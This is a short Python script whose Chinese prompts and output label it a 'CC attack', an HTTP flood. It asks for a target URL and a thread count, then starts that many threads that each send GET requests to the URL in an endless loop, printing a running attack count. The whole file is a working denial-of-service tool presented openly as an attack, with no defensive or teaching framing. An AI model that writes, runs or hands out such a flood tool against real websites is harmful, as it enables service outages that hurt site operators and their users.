import requests
from threading import Thread
print("CC攻击--------------------------")
th=int(input("请输入要开启的线程数量："))
url=input("请输入网址：")
l=[]
n=1
def dos(url):
    global n
    while True:
        r=requests.get(url)
        print("攻击第",n,"次")
        n+=1
for i in range(th):
    l.append(Thread(target=dos,args=(url,)))
for i in range(th):
    l[i].start()
